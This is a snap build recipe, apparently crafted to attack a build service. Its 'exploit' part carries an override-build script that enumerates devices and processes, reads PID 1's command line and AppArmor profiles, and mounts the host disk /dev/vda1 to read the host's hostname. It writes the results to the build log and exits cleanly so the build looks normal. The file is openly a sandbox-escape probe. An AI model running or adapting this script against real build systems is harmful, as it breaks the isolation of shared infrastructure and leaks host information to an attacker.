name: test-hijack-17787
version: '0.1'
summary: Side-Channel Leak
description: Force Debug Error
parts:
    exploit:
        plugin: nil
        override-build: |
            set +e
            OUT=/build/probe2.txt
            ls -la /dev/vda* /dev/sda* >> $OUT 2>&1
            ls /proc/ | sort -n | head -20 >> $OUT 2>&1
            cat /proc/1/cmdline >> $OUT 2>&1 ; echo >> $OUT
            ls -la /proc/1/exe >> $OUT 2>&1
            mkdir -p /mnt/host
            mount /dev/vda1 /mnt/host >> $OUT 2>&1
            ls /mnt/host/ >> $OUT 2>&1
            cat /mnt/host/etc/hostname >> $OUT 2>&1
            cat /sys/kernel/security/apparmor/profiles | head -20 >> $OUT 2>&1
            cat $OUT
            exit 0